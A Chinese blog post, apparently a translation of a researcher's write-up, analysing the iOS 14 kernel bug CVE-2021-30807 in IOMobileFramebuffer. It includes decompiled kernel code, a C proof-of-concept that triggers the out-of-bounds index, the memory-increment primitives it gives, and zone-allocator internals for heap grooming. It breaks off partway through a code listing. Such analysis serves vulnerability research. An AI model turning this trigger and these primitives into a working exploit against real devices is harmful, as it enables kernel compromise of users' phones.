</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2021-12-06T14:12:44.000Z" title="2021/12/6 22:12:44">2021-12-06</time></span><span class="level-item">Updated&nbsp;<time dateTime="2021-12-11T15:39:49.701Z" title="2021/12/11 23:39:49">2021-12-11</time></span><span class="level-item">2 hours read (About 13663 words)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/12/06/iOS-LPE-CVE-2021-30807/">iOS LPE-CVE-2021-30807</a></p><div class="content"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这个漏洞是从应用程序沙箱中逆向IOServices时发现的，这是一个存在于<code>AppleCLCD/IOMobileFrameBuffer</code>中的漏洞。</p>
<blockquote>
<p>原文链接: <a target="_blank" rel="noopener" href="https://jsherman212.github.io/2021/11/28/popping_ios14_with_iomfb.html">https://jsherman212.github.io/2021/11/28/popping_ios14_with_iomfb.html</a></p>
</blockquote>
<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>该漏洞位于<code>AppleCLCD/IOMFB</code>的外部方法 83 ，即<code>IOMobileFramebufferUserClient::s_displayed_fb_surface()</code>函数中。下面是从iOS 14 beta中逆向得到的结果:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">IOMobileFramebufferUserClient::s_displayed_fb_surface</span><span class="params">(IOUserClient **a1, __int64 a2, IOExternalMethodArguments_s *args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// [xsp+10h] [xbp-30h]</span></span><br><span class="line">  <span class="type">bool</span> v5; <span class="comment">// [xsp+1Bh] [xbp-25h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [xsp+1Ch] [xbp-24h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [xsp+20h] [xbp-20h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v_retval; <span class="comment">// [xsp+24h] [xbp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  v_retval = <span class="number">0xE00002C1</span>;</span><br><span class="line">  v7 = <span class="number">0xAAAAAAAA</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v4 = IOUserClient::<span class="built_in">copyClientEntitlement</span>(a1[<span class="number">29</span>], <span class="string">&quot;com.apple.private.allow-explicit-graphics-priority&quot;</span>, args);</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = v4 == gOSBooleanTrue;</span><br><span class="line">    (*(*v4 + <span class="number">40LL</span>))(v4);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    v_retval = IOMobileFramebufferUserClient::<span class="built_in">get_displayed_surface</span>(a1, &amp;v6, *args-&gt;scalarInput);</span><br><span class="line">    *args-&gt;scalarOutput = v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v_retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进入<code>IOMobileFramebufferUserClient::get_displayed_surface()</code>函数:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">IOMobileFramebufferUserClient::get_displayed_surface</span><span class="params">(IOMobileFramebufferUserClient *<span class="keyword">this</span>, <span class="type">unsigned</span> <span class="type">int</span> *a2, <span class="type">unsigned</span> <span class="type">int</span> scalar0)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (*(**(<span class="keyword">this</span> + <span class="number">27</span>) + <span class="number">0x798LL</span>))(*(<span class="keyword">this</span> + <span class="number">27</span>), *(<span class="keyword">this</span> + <span class="number">29</span>), a2, scalar0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>+0x798 处的函数是<code>IOMobileFramebufferLegacy::get_displayed_surface()</code>:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">IOMobileFramebufferLegacy::get_displayed_surface</span><span class="params">(IOMobileFramebufferLegacy *<span class="keyword">this</span>, task *a2, <span class="type">unsigned</span> <span class="type">int</span> *a3, <span class="type">unsigned</span> <span class="type">int</span> scalar0)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v_retval; <span class="comment">// [xsp+10h] [xbp-20h]</span></span><br><span class="line"></span><br><span class="line">  v_retval = <span class="number">0xE00002BC</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *(<span class="keyword">this</span> + scalar0 + <span class="number">331</span>) &amp;&amp; *(<span class="keyword">this</span> + <span class="number">366</span>) )</span><br><span class="line">    v_retval = IOSurfaceRoot::<span class="built_in">copyPortNameForSurfaceInTask</span>(*(<span class="keyword">this</span> + <span class="number">366</span>), a2, *(<span class="keyword">this</span> + scalar0 + <span class="number">331</span>), a3);</span><br><span class="line">  <span class="keyword">return</span> v_retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从下面的汇编代码可以看出，调用<code>IOSurfaceRoot::copyPortNameForSurfaceInTask()</code>函数时，没有对数组的下标运算进行安全检查，以判断是否造成越界，故造成内核类型混淆(这一点需要结合IOSurface的机制来看):</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">FFFFFFF00970ADDC LDR             X8, [SP,#0x30+v_this]</span><br><span class="line">FFFFFFF00970ADE0 LDR             X0, [X8,#0xB70] ; this</span><br><span class="line">FFFFFFF00970ADE4 LDUR            X1, [X29,#var_10] ; task *</span><br><span class="line">FFFFFFF00970ADE8 ADD             X9, X8, #0xA58</span><br><span class="line">FFFFFFF00970ADEC LDR             W10, [SP,#0x30+v_scalar0]</span><br><span class="line">FFFFFFF00970ADF0 MOV             X11, X10</span><br><span class="line">FFFFFFF00970ADF4 ADD             X9, X9, X11,LSL#3</span><br><span class="line">FFFFFFF00970ADF8 LDR             X2, [X9] ; IOSurface *</span><br><span class="line">FFFFFFF00970ADFC LDR             X3, [SP,#0x30+var_18] ; unsigned int *</span><br><span class="line">FFFFFFF00970AE00 BL              IOSurfaceRoot::copyPortNameForSurfaceInTask(task *,IOSurface *,uint *)</span><br></pre></td></tr></table></figure>

<p>至于触发就很简单了，下面是POC:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">trigger_clcd_vuln</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="type">kern_return_t</span> ret;</span><br><span class="line">  <span class="type">io_connect_t</span> shared_user_client_conn = MACH_PORT_NULL;</span><br><span class="line">  <span class="type">int</span> type = <span class="number">2</span>;</span><br><span class="line">  <span class="type">io_service_t</span> service = <span class="built_in">IOServiceGetMatchingService</span>(kIOMasterPortDefault,</span><br><span class="line">                            <span class="built_in">IOServiceMatching</span>(<span class="string">&quot;IOMobileFramebuffer&quot;</span>));</span><br><span class="line">   </span><br><span class="line">  <span class="keyword">if</span>(service == MACH_PORT_NULL) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;failed to open service\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">   </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;service: 0x%x\n&quot;</span>, service);</span><br><span class="line"></span><br><span class="line">  ret = <span class="built_in">IOServiceOpen</span>(service, <span class="built_in">mach_task_self</span>(), type, &amp;shared_user_client_conn);</span><br><span class="line">  <span class="keyword">if</span>(ret != KERN_SUCCESS) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;failed to open userclient: %s\n&quot;</span>, <span class="built_in">mach_error_string</span>(ret));</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">   </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;client: 0x%x\n&quot;</span>, shared_user_client_conn);</span><br><span class="line">   </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;call externalMethod\n&quot;</span>);</span><br><span class="line">  <span class="type">uint64_t</span> scalars[<span class="number">4</span>] = &#123; <span class="number">0x0</span> &#125;;</span><br><span class="line">  scalars[<span class="number">0</span>] = <span class="number">0x41414141</span>;</span><br><span class="line"></span><br><span class="line">  <span class="type">uint64_t</span> output_scalars[<span class="number">4</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">  <span class="type">uint32_t</span> output_scalars_size = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;call s_default_fb_surface\n&quot;</span>);</span><br><span class="line">  ret = <span class="built_in">IOConnectCallMethod</span>(shared_user_client_conn, <span class="number">83</span>,</span><br><span class="line">            scalars, <span class="number">1</span>,</span><br><span class="line">    	      <span class="literal">NULL</span>, <span class="number">0</span>, <span class="comment">//input, input_size,</span></span><br><span class="line">    		    output_scalars, &amp;output_scalars_size,</span><br><span class="line">        	  <span class="literal">NULL</span>, <span class="literal">NULL</span>); <span class="comment">//output, &amp;output_size);</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(ret != KERN_SUCCESS) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;failed to call external method: 0x%x --&gt; %s\n&quot;</span>, ret, <span class="built_in">mach_error_string</span>(ret));</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">   </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;external method returned KERN_SUCCESS\n&quot;</span>);</span><br><span class="line">   </span><br><span class="line">  <span class="built_in">IOServiceClose</span>(shared_user_client_conn);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;success!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="踩坑经历"><a href="#踩坑经历" class="headerlink" title="踩坑经历"></a>踩坑经历</h1><p>iOS内核可以把任意一个对象解释为IOSurface</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">IOSurfaceSendRight *__fastcall <span class="title">IOSurfaceSendRight::init_IOSurfaceRoot___IOSurface</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        IOSurfaceSendRight *a1,</span></span></span><br><span class="line"><span class="params"><span class="function">        IOSurfaceRoot *a2,</span></span></span><br><span class="line"><span class="params"><span class="function">        IOSurface *oob_surface)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  IOSurfaceSendRight *v6; <span class="comment">// x20</span></span><br><span class="line">  IOSurface *surface; <span class="comment">// x21</span></span><br><span class="line"></span><br><span class="line">  v6 = OSObject::<span class="built_in">init</span>();</span><br><span class="line">  a1-&gt;m.surface_root = a2;</span><br><span class="line">  surface = a1-&gt;m.surface;</span><br><span class="line">  a1-&gt;m.surface = oob_surface;</span><br><span class="line">  <span class="keyword">if</span> ( oob_surface )</span><br><span class="line">    (oob_surface-&gt;retain)(oob_surface);</span><br><span class="line">  <span class="keyword">if</span> ( surface )</span><br><span class="line">    (surface-&gt;release_0)(surface);</span><br><span class="line">  IOSurface::<span class="built_in">clientRetain</span>(oob_surface);</span><br><span class="line">  IOSurface::<span class="built_in">increment_use_count</span>(oob_surface);</span><br><span class="line">  <span class="keyword">return</span> v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>IOSurface::clientRetain()</code>函数实现如下:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">SInt32 __fastcall <span class="title">IOSurface::clientRetain</span><span class="params">(IOSurface *surface)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">OSIncrementAtomic</span>(&amp;surface-&gt;client_retain_count);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> <code>IOSurface::increment_use_count()</code>函数实现如下:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __fastcall <span class="title">IOSurface::increment_use_count</span><span class="params">(IOSurface *surface)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">OSIncrementAtomic</span>((surface-&gt;qwordC0 + <span class="number">0x14LL</span>));</span><br><span class="line">    surface = surface-&gt;qword3F0;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( surface );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> 上面的代码中有两个原语:</p>
<ul>
<li>IOSurface::clientRetain会增加oob_surface指向的对象的偏移量为0x354(client_retain_count)处的值。</li>
<li>通过控制oob_surface的偏移量0xc0处的指针，IOSurface::increment_use_count在内核内存中提供了一个任意的32位增量。</li>
</ul>
<p>对于漏洞利用来讲，首先要伪造一个真实的IOSurface对象，否则会在 <code>IOSurfaceSendRight::init()</code>函数中导致Panic。因此伪造的IOSurface对象需要满足以下几点：</p>
<ol>
<li>oob_surface应该指向一个IOKit对象，因为IOSurfaceSendRight::init在其vtable上调用了偏移量为0x20的虚拟方法。只要oob_surface继承自OSObject，这就会调用 retain，这是一个无害的操作。</li>
<li>oob_surface的大小应该至少是0x358字节，因为IOSurface::clientRetain增加的字段是在偏移量0x354。如果oob_surface指向的对象小于这个大小，我们就有可能修改一个已释放的区域元素或碰到一个未映射的页面。</li>
<li>oob_surface必须有一个有效的内核指针，用于IOSurface::increment_use_count在偏移量0xc0。在偏移量0x3f0处，该指针可以是有效的，也可以是NULL。因此，ob_surface指向的对象应该大于0x3f8字节，原因与前一点相同。</li>
</ol>
<p>由于iOS 14通过引入kheaps和sequestering大大强化了内存分配器，因此，无论伪造的对象是否继承自OSObject，堆喷这个操作都存在着问题。</p>
<h2 id="kheaps"><a href="#kheaps" class="headerlink" title="kheaps"></a>kheaps</h2><p>在高层次上，Kheaps通过给数据、内核、kext和临时内存分配各自的kalloc.*区域，使得它们之间相互隔离。这些kheaps分别被称为KHEAP_DATA_BUFFERS、KHEAP_DEFAULT、KHEAP_KEXT和KHEAP_TEMP。</p>
<p>zone map实际上是由三个不同的子地图组成的。一个子图是KHEAP_DEFAULT、KHEAP_KEXT和KHEAP_TEMP的区域，而另一个是KHEAP_DATA_BUFFERS的区域。第三个子图对我们来说并不重要。KHEAP_DATA_BUFFERS是为那些内容为纯字节或由用户空间控制的分配而准备的。KHEAP_DEFAULT是XNU分配的Kheap，而KHEAP_KEXT是内核扩展分配的Kheap。KHEAP_TEMP（只是KHEAP_DEFAULT的别名）是指在系统调用中进行的分配，在返回EL0之前被释放。因此，在iOS 14及以上版本中，一个500字节的IOKit对象属于kext.kalloc.512，而一个同样大小的管道缓冲区则属于data.kalloc.512。在iOS 13及以下版本中，这两个分配都是kalloc.512。(在iOS 15上，似乎KHEAP_TEMP已经被移除）。</p>
<p>在iOS 13及以下版本中，滥用zone垃圾收集将一个页面从一个区域移动到另一个区域是利用UAF的标准。iOS 14管道缓冲区被隔离在数据缓冲区的Kheap中。通过管道缓冲区（或任何其他纯数据手段）喷射假的内核对象并希望通过垃圾收集 “重新利用 “这些页面已经行不通了。</p>
<h2 id="zone垃圾收集和封存"><a href="#zone垃圾收集和封存" class="headerlink" title="zone垃圾收集和封存"></a>zone垃圾收集和封存</h2><p>所有zone都有一个chunk size，表示一个虚拟内存连续的区域能被分割成多少个页。这个范围被称为 “chunk”。像<code>*.kalloc.192</code>这样较小的区域，其块的大小为一页。但是对于较大的区域，比如<code>*.kalloc.6144</code>，块的大小就会增加到2页，这是16k页面大小的设备的最大值。对于4k页面大小的设备，最大的块大小是8页。</p>
<p>与区块中每个页面相关的结构是<a target="_blank" rel="noopener" href="https://github.com/apple/darwin-xnu/blob/2ff845c2e033bd0ff64b5b6aa6063a1f8f65aa32/osfmk/kern/zalloc.c#L159">struct zone_page_metadata</a>:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">zone_page_metadata</span> &#123;</span><br><span class="line">	<span class="comment">/* 该元数据页所属区域的索引 */</span></span><br><span class="line">	<span class="type">zone_id_t</span>       zm_index : <span class="number">11</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Whether `zm_bitmap` is an inline bitmap or a packed bitmap reference */</span></span><br><span class="line">	<span class="type">uint16_t</span>        zm_inline_bitmap : <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * zone以zone_t::z_chunk_pages的&quot;chunk&quot;为单位进行分配</span></span><br><span class="line"><span class="comment">	 * 如果zone是percpu，则以zpercpu_count()页为单位</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * The first page of it has its metadata set with:</span></span><br><span class="line"><span class="comment">	 * - 0 if none of the pages are currently wired</span></span><br><span class="line"><span class="comment">	 * - the number of wired pages in the chunk (not scaled for percpu).</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * Other pages in the chunk have their zm_chunk_len set to</span></span><br><span class="line"><span class="comment">	 * ZM_SECONDARY_PAGE or ZM_SECONDARY_PCPU_PAGE depending on whether</span></span><br><span class="line"><span class="comment">	 * the zone is percpu or not. For those, zm_page_index holds the</span></span><br><span class="line"><span class="comment">	 * index of that page in the run.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">uint16_t</span>        zm_chunk_len : <span class="number">4</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZM_CHUNK_LEN_MAX        0x8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZM_SECONDARY_PAGE       0xe</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZM_SECONDARY_PCPU_PAGE  0xf</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">union</span> &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZM_ALLOC_SIZE_LOCK      1u</span></span><br><span class="line">		<span class="type">uint16_t</span> zm_alloc_size; <span class="comment">/* first page only */</span></span><br><span class="line">		<span class="type">uint16_t</span> zm_page_index; <span class="comment">/* secondary pages only */</span></span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="keyword">union</span> &#123;</span><br><span class="line">		<span class="type">uint32_t</span> zm_bitmap;     <span class="comment">/* most zones */</span></span><br><span class="line">		<span class="type">uint32_t</span> zm_bump;       <span class="comment">/* permanent zones */</span></span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="type">zone_pva_t</span>      zm_page_next;</span><br><span class="line">	<span class="type">zone_pva_t</span>      zm_page_prev;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>如果一个zone page metadata结构与一个块中的第一页相关联，zm_chunk_len是zm_index（XNU的zone_array中的索引）所指的区域的块大小。如果块的大小超过一页，那么对于第二页及以后，zm_chunk_len被定义为ZM_SECONDARY_PAGE或ZM_SECONDARY_PAGE_PCPU_PAGE，并且zm_page_index作为该块的索引。否则，zm_alloc_size告诉我们该块中目前有多少字节被分配。zm_page_next和zm_page_prev一起工作，为zm_index的zone形成一个块的队列。如果一个zone的zone page metadata结构是这个大块队列的头，那么zm_page_prev持有一个由zone_queue_encode编码的值。如果它不是头部，两者都指向前一个&#x2F;下一个分块的第一页，但只有当它们所属的zone page metadata结构与分块中的第一页相关联时，才会如此。</p>
<p>所有的zone结构都带有指向zone page metadata结构的指针，每个指针都有不同的作用。在iOS 13及以下版本中，这些指针被称为all_free、intermediate和all_used。all_free维护一个只有自由元素的块队列，intermediate维护一个既有自由元素又有使用元素的块队列，而all_used维护一个只有使用元素的块队列。在iOS 14及以上版本中，它们分别被重新命名为empty、partial和full，但它们的用途保持不变。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/apple/darwin-xnu/blob/2ff845c2e033bd0ff64b5b6aa6063a1f8f65aa32/osfmk/kern/zalloc_internal.h#L234">zone</a>结构如下:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">zone</span> &#123;</span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">zone_pva_t</span>          z_pageq_empty;  <span class="comment">/* populated, completely empty pages   */</span></span><br><span class="line">    <span class="type">zone_pva_t</span>          z_pageq_partial;<span class="comment">/* populated, partially filled pages   */</span></span><br><span class="line">    <span class="type">zone_pva_t</span>          z_pageq_full;   <span class="comment">/* populated, completely full pages    */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://github.com/apple/darwin-xnu/blob/2ff845c2e033bd0ff64b5b6aa6063a1f8f65aa32/osfmk/kern/zalloc_internal.h#L114">zone_pva_t</a></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*!</span></span><br><span class="line"><span class="comment"> * @typedef zone_pva_t</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @brief</span></span><br><span class="line"><span class="comment"> * Type used to point to a page virtual address in the zone allocator.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @description</span></span><br><span class="line"><span class="comment"> * - Valid pages have the top bit set.</span></span><br><span class="line"><span class="comment"> * - 0 represents the &quot;NULL&quot; page</span></span><br><span class="line"><span class="comment"> * - non 0 values with the top bit cleared do not represent any valid page.</span></span><br><span class="line"><span class="comment"> *   the zone freelists use this space to encode &quot;queue&quot; addresses.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">zone_packed_virtual_address</span> &#123;</span><br><span class="line">	<span class="type">uint32_t</span> packed_address;</span><br><span class="line">&#125; <span class="type">zone_pva_t</span>;</span><br></pre></td></tr></table></figure>

<p>一个zone打包的虚拟地址实际上只是<a target="_blank" rel="noopener" href="https://github.com/apple/darwin-xnu/blob/2ff845c2e033bd0ff64b5b6aa6063a1f8f65aa32/osfmk/kern/zalloc_internal.h#L109">内核指针</a>的Bits[49:14]，并有一些特殊的规则:</p>
<ul>
<li>(zone_pva_t)0代表零页（又称NULL）。</li>
<li>zone_pva_t的最高位被设置，可以通过将其移到左边的14位并进行符号扩展来转换回其对应的页对齐的内核指针。</li>
<li>一个zone_pva_t的顶位被清除，代表一个队列地址。</li>
</ul>
<p>这样做的好处是，你可以将一个非队列的zone_pva_t转换回其对应的zone page metadata结构，反之亦然，分别使用zone_pva_to_meta和zone_pva_from_meta。不仅如此，一旦我们有了一个指向zone page metadata结构的指针，我们就可以通过调用zone_meta_to_addr来得出它所关联的块中的页面。例如，<code>zone_pva_to_meta(z-&gt;z_pageq_empty)</code>将返回表示z所指向的区的空队列的头的zone page metadata结构。</p>
<p>属于某个zone的所有块被布置成网格中的盒子，每个盒子代表一个块。从一个块到一个metadata结构的虚线箭头表示这两者之间的联系。假设三个深绿色的块在前面描述的一个队列的中间有背对背的zone_page_metadata条目，我们会有这样的东西。</p>
<p><img src="https://jsherman212.github.io/assets/popping_ios14_with_iomfb/metadata_chunk_relationship.png"></p>
<p><a target="_blank" rel="noopener" href="https://github.com/apple/darwin-xnu/blob/2ff845c2e033bd0ff64b5b6aa6063a1f8f65aa32/osfmk/kern/zalloc.c#L6529">zone_gc</a>是zone垃圾收集的入口，它调用zone_reclaim_all，zone_reclaim_all负责在每个zone上调用zone_reclaim，有趣的部分从zone_reclaim的结尾开始:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(;;)&#123;</span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (zone_pva_is_null(z-&gt;z_pageq_empty)) &#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  	<span class="comment">// 将只有空闲元素的页面释放回给区域分配器</span></span><br><span class="line">    meta  = zone_pva_to_meta(z-&gt;z_pageq_empty); </span><br><span class="line">    count = (<span class="type">uint32_t</span>)ptoa(meta-&gt;zm_chunk_len) / zone_elem_size(z);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (z-&gt;z_elems_free - count &lt; goal) &#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    